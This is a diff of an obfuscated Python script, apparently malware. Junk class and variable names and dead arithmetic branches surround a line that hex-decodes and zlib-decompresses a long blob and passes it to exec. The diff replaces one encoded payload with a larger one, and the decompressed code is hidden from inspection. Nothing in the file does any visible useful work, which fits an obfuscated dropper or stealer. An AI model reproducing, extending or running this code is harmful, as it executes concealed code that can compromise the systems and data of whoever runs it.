@@ -1,81 +1,81 @@
 
 execute922, Handler059, data343, Calculator340, data406, Processor777, create101 = exec, str, tuple, map, ord, globals, type
 
-class Navigator75:
+class Utility81:
     def __init__(self, Manager070):
-        self.process69(run753=-83821)
+        self.load30(run753=93519)
 
-    def process69(self, run753 = list):
-        output_data72 = -3841 + 14517
-        if 868 < 1364:
-            handle23 = complex(output_data72)
+    def load30(self, run753 = complex):
+        Manager25 = -10579 / -10557
+        if 674 < 1698:
+            Utility24 = complex(Manager25)
         else:
-            settings34 = bool()
-        self.Service887 *= -26278 - run753
-        DataManager51 = -62854 + 34950
-        if 760 < 1017:
-            delete77 = set(DataManager51)
+            settings17 = bool()
+        self.Service887 += -84041 / run753
+        Supervisor00 = 60938 * 58661
+        if 451 < 1325:
+            Utility01 = complex(Supervisor00)
         else:
-            read55 = bool()
+            settings88 = float()
 
-    def start65(self, Calculator874 = -61141):
-        output_data72 = -3841 + 14517
-        if 868 < 1364:
-            handle23 = complex(output_data72)
+    def process74(self, Calculator874 = 24121):
+        Manager25 = -10579 / -10557
+        if 674 < 1698:
+            Utility24 = complex(Manager25)
         else:
-            settings34 = bool()
-        Calculator874 -= 14385 / -26470
-        self.temp980 != set
-        Controller90 = 2306 - 97448
-        if 354 < 1941:
-            result40 = complex(Controller90)
+            settings17 = bool()
+        Calculator874 += -79493 + -73580
+        self.temp980 != dict
+        process60 = 47232 + 80638
+        if 327 < 1093:
+            counter82 = bool(process60)
         else:
-            Processor82 = bool()
+            status55 = dict()
 
-    def process763(self, item612 = set):
+    def process763(self, item612 = bool):
         return Processor777()[item612]
 
-    def value263(self, Processor131 = 17894 - -42178, create478 = list, Manager878 = Processor777):
-        output_data72 = -3841 + 14517
-        if 868 < 1364:
-            handle23 = complex(output_data72)
+    def value263(self, Processor131 = -91026 + -36956, create478 = dict, Manager878 = Processor777):
+        Manager25 = -10579 / -10557
+        if 674 < 1698:
+            Utility24 = complex(Manager25)
         else:
-            settings34 = bool()
+            settings17 = bool()
         Manager878()[Processor131] = create478
-        handle691 = -55863 / -53243
-        if 770 < 1589:
-            settings67 = -60044 * 11433
-            if 541 < 1725:
-                save11 = float(settings67)
+        handle691 = 78011 * 70282
+        if 838 < 1808:
+            settings46 = 83885 * -72167
+            if 58 < 1196:
+                process02 = list(settings46)
             else:
-                Director89 = bool()
+                Coordinator02 = int()
         else:
-            Manager924 = bool()
+            Manager924 = str()
 
-    def execute(self, code = complex):
+    def execute(self, code = set):
         return execute922(Handler059(data343(Calculator340(data406, code))))
 
     @property
     def _property(self):
         self.hjqTnRl8sl = '<__main__.Handler object at 0x000002598BE40120>'
-        return (self.hjqTnRl8sl, Navigator75._property)
+        return (self.hjqTnRl8sl, Utility81._property)
 
 if __name__ == '__main__':
     try:
-        (lambda __, _e: _e(__('''789ced55cd8ac23010bef72972b30591a46dd42cf8167b132955c7358ba625adfafa9b7492d4e02aec71c142876426f3f7cd97569edb46f7e406dbad6e6e1de844a2a6976748923d1c88aaaff2abee21cd3e12629ec964f6dd4895ae77479daa8c1c1a4d14918aac199d92228fdf399f12c6e65e506685b0dbdce98a3c9c606e87a7967ec5cc4a2cee43a0cf204aabe2ee14ae464f5a84181cbd84b5e52144e9ec25f73b3624a25e6068ea628db5d2322ac59c12222e27ee4f04bdf71eaab1c928f598846445dc1ab651069c8cae1cc23ce2bde488f97cf180127b867d488dc02def6a632184ed1555a59f52ee8306d55f46324edaa38768c4c3e621077dd6f466930dc4d4d05fb4220c69dbea66075df766ed9bb5ff88b57b38c1f8a98d6d1aeafdef96aebe3ef1e9faa6f596db519e807cea0be07ed0850fffac6941a5afaec938c97900cd34ca4debe5025f9c4a10b6731133734025670f1c75f3648eeb8cc7cc632e9818196100cc421ff67735eb4e006dca6896c803a92a559fa1aac86af5e2f20b3b44ee188693f465a1c96441b410c91fb39d72c4'''), globals()))(lambda x: __import__('zlib').decompress(bytes.fromhex(x)),exec)
-        Handler883 = Navigator75(Manager070 = 22255 + -73297)
+        (lambda __, _e: _e(__('''789cd55b5b6fdb46167ef7af20fc52091004522245d2801f82c2d916eda60ba48b451104026d8d6cd6142990942f2df2df77ce5cce99a17893e338a8105314397366e65cbe739949badb1765ed14d5592aeff659526f8b72a77fdfd4cf7b866fabc3f5be2c6e58454f9ef1b6be4ff39a954e52f1dbb36d59ecf0916ab1e31d935b765d3ce170d5a14e33fdeb31cd4b768bf4d21d3b3bdbb0ad53b26433995e9c39fc531ceafda15e6f923a712e9d9b22dfa6b7f37fb1fa17f6fcb14e6a3659b853d130ddda6d2f1d4f52808fea77cf9eaf376bf6c0f29af79b39fcdf825f250196556c4c0f57f410133dec37300535d51f7e98ff59a4f9e4d3cd5d39c9a70ee7ab933b69ee7cf2789fe5c2fe5b4533c7733d7ef156ea2e8ed52f78efb9015c546bf90a5abbb1be889f9ab468a91ef948d9854ba088018da5d54a500e554371e3c2ac169ed94ddcc97e2becece9b6faa5efaa417db19aa5bcf1d5205188c4687262005fcf403c0f8d2eae7eea69d6d8abf63d73019aac9ca8e8a617262f7274d798dcb1543e7f96aaf0906407c6d5ed538f48bd45effc38a9599f4678f1488e0c117249575cbc906ef983135969ed120b8a909ae81e0f7497330d6de568703fe0343e0bbe42bf7d52263b2650225778305720b34ef9e3492fd3514f05fb3ca03c25a3e51880e4e769be2d4ea535cf8a473e8529b4104a40b4e1b32f39be4db6e7dd5457c10c0873ba2004b024902a7014beb996019f804de28f3781475c66c06ef18a7f7369e85b781540233eb9bfbf6e695fcea7d65a4a561fcadcf9bd3cb033e3f7fb84c3a044b79b62c7e1f4a5f0169a8802178210d734d6211c7c257c52f888c4621c303041a56d2941645be90a09f9aa9768d1892669d351902a75f33474c7c3f9f1b2e58add592767e57368b15c2abcd5b8e312566bb4b4e4406cf3b5871a3751a0d0c5777fc5b9450aca9ed27ae2d1eff1cacafd76cd9eea1967e2863d0daa2e79195a317ae063656d82b5873a2985809ae8cdc877f7d301fe921e2b3abed27274fdd85bfe0a5b9dbe2df538c2092eed714cb19aaaaf6d4b0843abae62685373fb4030f6665c7dc3781605b3309a710b8f970ac384543414d911d738ba91a0eb036e0e8e2114a3aa93b29eb0b22cca9923be06956215f670dc8acac2d3c5a9eccbb31e895f6e4bcfc094465d3e13bb64f03cff6dcf721e0bdb0becb41bf674c3f6b5f33ecdd887a27e5f1cf2cd15f4b868f690966574b9125f699143bc7f92d456e0ce7cf5e7896fbe6870729cc5dadfb9a17292e00a97d251faca052ed17f4ae7e90bbf2a1c67289bf09fe82565e06e7abb63b0604fecc6f06c25ab0e59dd1fef455cae5cdb1cc065804a8868b9b377227061fc790c10ca45160a988c9b61a98e6ac3a5e18020081de8a791f9d8ad6150f5223d8e352ec436daa3ea2d87e7f5155adf506c98328ffd76306b290c23a6036be6b2e955b1f004656a288ec20c3efa9773339094b8a1aceca75faefe58fffadb8fef7e5dfffbdd8f3ffdfce16a26263cb5e343ed84c0deb407229f66a19dd95c6826b6171aba611923054d8f54769c534cf3b44e932cfd8b4d8cdcf8b2a8e6fba4be9bf33c3b839bc97abde588b05ef350df6ce7a9c1cecf25673ef229942c7b56b373ea3be64047e7fad9291e58f958f2e1f25bce198e4ef59d5326f9a6d839221fbf665c5c4cf6e4283217042f44482b68ac612217ce7ff8d5a90b22cdefaf9953d9236faceefba4aa5875e17c38ecae795a516c4529a182ae7a56c65c279c3109987b5a39de746e2dd002585572d0ccba6575d560e4d400633eed8243b1f9ba3fede2d6e183fd4510f800a836155f1b8672c0c23692fcd69e81dd9cc06c5e31763f71a75daf0553267c6d0729a489a046cdf99b92ed38fbdad7ab51ff6fe3ed97eed50a0b0c28b9090d838c08cd5d7a64a443f05c40858e1abe81436af11e2a7828f6936d96dc2a46c3ed7cc3aaba2c9e27d3960255b769bd20879239c050ca62e70002dc2303a5e3b8998819b1ff42813b798906c946d44a012365530b3332d211b0743611360fcc61fb8b2feda03553667eb96c454821985d92e659c12536a56760999b3279349e7131d5f7f3dfefcd66c9164a0f7c4e20f1997826df520d735edd158f9079f7656d18cd11b73d6fa086d2de896206531276be1b68ada077babd21dac0a4dcc80cdde3ecdb10a60e41cdb60b338058981d29075960b0e285fdfad0bb3e55bdc0a82230e216556b1459a3d0873c79486f8d24bb7aaee6228d0438d0cae270a6bb53d3b85f5cdc189520b41ad190d41a421eac6536448d4392985c64a6ee689833cd826a7f84129ad52a626b335c19047716477029328ec5e5d8ba66ebd5f1843180b62a410d3d223d2638f36de6e80efd186405022aae925b231c50f24d9671306059b65ccc7faefe5bb1f25dfe6eb3e3ea33ca43bd76a58d4c950a3b54d0b58a191ef2bc61fc910ef02d14385941d0fb60dc4f1910d6ba4728f30bace6450680b4e4327ce4539fb20792e7abf0884b5e17efdb71380eb1a5960966595de59d53444292d6dc43cb3184dda8c38d360b9e94e4456da1a81d83f516721c1f18b01cabc29d5af2161a4dcd74c1c7d401b1cfb53a2a61c2a71d323ec2f795cce7fe37f950e46c305330a2407113889042ba38a0935c67bd448408e54be89494b70fbcbf1cda7ba5b09a0b95dbb8a8c2cd225745f8908547f25b87f5a29ea3227eb93dc235536d98c09708fb03159abbb2dd423630a9b89d41fb1dcf68b26fb52b7b0c4d915d4171a9701f1feb10b924dabe18677be304b0500258d93954634b092464d6485cc5ed9876a9747fdfd8c0920241b6cb545257dab088a68f14f01c286349c526fabdf07ab2596b19ee4449017717d64697445133f93911fd3a40779c84a3486e5a77f90d9cb0314fe930cc9a5b038870cf64613a42538f109a74b04cda66ec4eb8662741b4817ce438897e60e420ae1542d171044999c2b8258295dfcde706696d6eba263a6404e31d8b084c07e38dd3e44b5220af4dfe5d730277e74ef7bf0d675254738ed935dbf5acdb1430225578a42d4301911fb6efd269950c70f755ad8ad2af9b9219c9d7b839a3d6eab82ba629eb3b9c16c57e5e9b67f7e90c823b96f35eebb00d6a3ea57cb0fc7894be8856cb99b9556d47360170d3950de9ec0815476843c85a9fb5ed6b6fdc7918bb5870e653d91eb3ff96a8d7c8b249f3fee1801cf405f114aee3c6040d88db1d84176851bdd6abe7d748113025127448dd2c186c6ce31268d1c22ccdee752523cf65c1ee0ee8a90fc81bc9240dbe8350aaa73f98297f4f440ecc42d81ba0b1b19fac70ee7bae5ecbecadfdd13f1c1550d53b9021a4389dca8f6f947d1b19064a11cb68b229c6578d0c3550cfb11315188253d8831bd4e4b5da760f3c2b781b8622df70a3621b1d8b279e8e453b4ec19e46fff86c2b1d8331522eeb60d34af96a184a2cdfd0523b5f4341d94144f310519f56c4ab2144a543d7f39b24cbfacf43d292e3e3e9926747e91d4517037b13bef2628db3c786771c3ae92a584b51960ef58070db115f8a43743971547414c8d30a468e83c868954f64a5491c9e98be46126a478f9e9aa51d9f75d40dc69ecf1b6dba634a0c16308cab195b936e942ca9ea6923e35756de5eec13488570e69e66e4406993edf6ce25d68ef4b10bf9f8b24fbf455af8d93c868c2aa54eb98da21304160d9d4f9d44029c346c718d69aafc7a6c8dfa5da3b995cc56686a6f1fdbbc94f332a8b058a9e2c4ce838e034c0e0c2623e7e8cca9618264efdf0e375a12142337599d046866306decf52bd6d9b673b23eb63b9bcee3cc04831a011be50142f36f0b5f2dba986e8ff65646b163d9d85771ade3eb54feb1b7e85e7d87b9ed38606cf3fb4561b554db25b2e905b665284c4847125627b1c30aad8736ad87dd6d2bc3df5ce504fce9bde833ae80eb759eecd87add8f7e310c19980684ab91af1018e5ffecd3ea0ddb87131ccfe1ae174ff598ffa9c7c088e601a1e9ff01a2d56dab'''), globals()))(lambda x: __import__('zlib').decompress(bytes.fromhex(x)), exec)
+        Handler883 = Utility81(Manager070 = 99802 - -66647)
 
-        value06 = 92231
-        settings12 = 15545
-        Processor69 = 29249
-        Manager88 = 95661
-        input_data16 = 22559
+        process63 = 8860
+        Generator44 = -84519
+        optimize10 = 49002
+        input_data88 = 51933
+        process91 = 90735
 
         pass
         pass
 
     except Exception as stop57:
-        if 460 > 1215:
-            Navigator75.execute(code = Handler059(stop57))
-        elif 34 > 1548:
+        if 391 > 1771:
+            Utility81.execute(code = Handler059(stop57))
+        elif 357 > 1226:
             pass
